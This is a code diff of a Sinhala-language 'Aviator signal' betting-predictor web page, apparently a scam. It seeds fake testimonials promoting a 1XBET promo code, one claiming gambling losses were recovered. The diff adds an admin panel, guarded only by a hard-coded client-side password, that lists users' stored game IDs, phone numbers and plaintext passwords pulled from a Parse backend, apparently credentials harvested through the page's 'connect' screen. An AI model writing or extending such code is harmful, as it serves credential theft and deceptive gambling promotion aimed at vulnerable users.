+      const INITIAL_FEEDS = [{ name: 'Dulan Chamika', msg: `අඩේ මරු අයියෙ මේක නම් 100% sure signal 🔥\nVIPCNA කෝඩ් එකෙන් අලුත් 1XBET account \nඑකක් හදා ගත්තට පස්සෙ තමා \nsignal සුපිරියටම වැඩ කරේ 💸🤩❤️`, }, { name: 'Dilshan Jayavardana', msg: 'Signal nam Signal Supiri Ahh' }, { name: 'ජානකී හේරත්', msg: 'ලක්ෂ 8 ක් ලොස් වෙලා හිටියෙ , දවස් තුනෙක් කවර් කරා මේ ඇප් එක නිසා මුළු loss එකම , ඇත්තටම ගොඩක් ස්තුතී' }, { name: 'වසන්ත ජයතිලක', msg: 'Thank Brother Aviator Signal මරු ❤️' },];
       const AV_COLORS = ['#e53935','#d81b60','#8e24aa','#3949ab','#1e88e5','#00897b','#7cb342','#f9a825','#ef6c00'];
       const PERSON_SVG = `<svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg>`;
       
@@ -519,32 +507,42 @@
         const color = AV_COLORS[h % AV_COLORS.length];
         const li = document.createElement('li');
         li.className = 'feedItem';
-        li.innerHTML = `
-          <div class="feedHead">
-            <div class="avatar" style="--avbg: ${color}">${PERSON_SVG}</div>
-            <div class="name">${escapeHtml(name)}</div>
-          </div>
-          <div class="msg">${highlightPromo(message)}</div>`;
+        li.innerHTML = `<div class="feedHead"><div class="avatar" style="--avbg: ${color}">${PERSON_SVG}</div><div class="name">${escapeHtml(name)}</div></div><div class="msg">${highlightPromo(message)}</div>`;
         return li;
       }
       
-      function renderInitialFeeds() {
-        feedList.innerHTML = '';
-        INITIAL_FEEDS.forEach(f => feedList.appendChild(createFeedItem(f.name, f.msg)));
-      }
+      function renderInitialFeeds() { feedList.innerHTML = ''; INITIAL_FEEDS.forEach(f => feedList.appendChild(createFeedItem(f.name, f.msg))); }
       
       function handleSendFeedback() {
         const name = (fbNameInput.value.trim() || 'Anonymous');
         const text = fbTextInput.value.trim();
-        if (!text) {
-          fbNote.textContent = 'කරුණාකර පළමුව ඔබේ අදහස ලියන්න.';
-          return;
-        }
+        if (!text) { fbNote.textContent = 'කරුණාකර පළමුව ඔබේ අදහස ලියන්න.'; return; }
         feedList.prepend(createFeedItem(name, text));
-        fbTextInput.value = '';
-        fbNameInput.value = '';
+        fbTextInput.value = ''; fbNameInput.value = '';
         fbNote.textContent = 'යවන ලදී ✓';
         setTimeout(() => fbNote.textContent = '', 1200);
+      }
+      
+      async function fetchAdminData() {
+        adminDataView.textContent = 'Loading data...';
+        const UserConnection = Parse.Object.extend("UserConnection");
+        const query = new Parse.Query(UserConnection);
+        query.descending("createdAt");
+        try {
+            const results = await query.find();
+            if (results.length === 0) { adminDataView.textContent = 'No connections saved yet.'; return; }
+            const dataText = results.map((conn, index) => {
+                const timestamp = conn.createdAt.toLocaleString('si-LK');
+                const gameId = conn.get('gameId');
+                const phone = conn.get('phoneNumber');
+                const pass = conn.get('password');
+                return `${index + 1}. Time: ${timestamp}\n   Game ID: ${gameId}\n   Phone: ${phone}\n   Password: ${pass}`;
+            }).join('\n\n');
+            adminDataView.textContent = dataText;
+        } catch (error) {
+            console.error("Error while fetching admin data: ", error);
+            adminDataView.textContent = 'Error fetching data. Check console.';
+        }
       }
 
       const sctx = starfieldCanvas.getContext('2d', { alpha: true });
@@ -553,10 +551,8 @@
       function resizeStarfield() {
         sDpr = Math.min(window.devicePixelRatio || 1, 2);
         sWidth = innerWidth; sHeight = innerHeight;
-        starfieldCanvas.width = Math.floor(sWidth * sDpr);
-        starfieldCanvas.height = Math.floor(sHeight * sDpr);
-        starfieldCanvas.style.width = sWidth + 'px';
-        starfieldCanvas.style.height = sHeight + 'px';
+        starfieldCanvas.width = Math.floor(sWidth * sDpr); starfieldCanvas.height = Math.floor(sHeight * sDpr);
+        starfieldCanvas.style.width = sWidth + 'px'; starfieldCanvas.style.height = sHeight + 'px';
         sctx.setTransform(sDpr, 0, 0, sDpr, 0, 0);
         const count = Math.min(220, Math.floor((sWidth * sHeight) / 9000));
         stars = [];
@@ -564,11 +560,7 @@
           const r = 0.4 + Math.random() * 1.6;
           const speed = 10 + r * 35;
           const angle = (-90 + (Math.random() * 20 - 10)) * Math.PI / 180;
-          stars.push({
-            x: Math.random() * sWidth, y: Math.random() * sHeight, r,
-            vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
-            twPhase: Math.random() * Math.PI * 2, twSpeed: 0.6 + Math.random() * 1.4,
-          });
+          stars.push({ x: Math.random() * sWidth, y: Math.random() * sHeight, r, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, twPhase: Math.random() * Math.PI * 2, twSpeed: 0.6 + Math.random() * 1.4 });
         }
       }
 
@@ -592,9 +584,7 @@
       function init() {
         window.addEventListener('load', openIntro);
         window.addEventListener('resize', resizeStarfield);
-        skipIntro.addEventListener('click', () => {
-          barFill.style.width = '100%'; barPct.textContent = '100%'; closeIntro();
-        });
+        skipIntro.addEventListener('click', () => { barFill.style.width = '100%'; barPct.textContent = '100%'; closeIntro(); });
         genBtn.addEventListener('click', handleGenerateClick);
         clearBtn.addEventListener('click', () => { history.length = 0; renderHistory(); });
         connectBtn.addEventListener('click', () => showScreen('connect'));
@@ -605,9 +595,21 @@
         fbSendBtn.addEventListener('click', handleSendFeedback);
         document.querySelectorAll('.open-tg').forEach(a => a.addEventListener('click', handleSocialLink));
         
+        adminBtn.addEventListener('click', async () => {
+            const pass = prompt('Enter Admin Password:');
+            if (pass === '2003') {
+                showScreen('adminPanel');
+                await fetchAdminData();
+            } else if (pass !== null) {
+                alert('Incorrect Password!');
+            }
+        });
+        backFromAdmin.addEventListener('click', () => showScreen('home'));
+        
         renderInitialFeeds();
         resizeStarfield();
         requestAnimationFrame(animateStarfield);
+        setInterval(gameLoop, 250);
       }
 
       init();
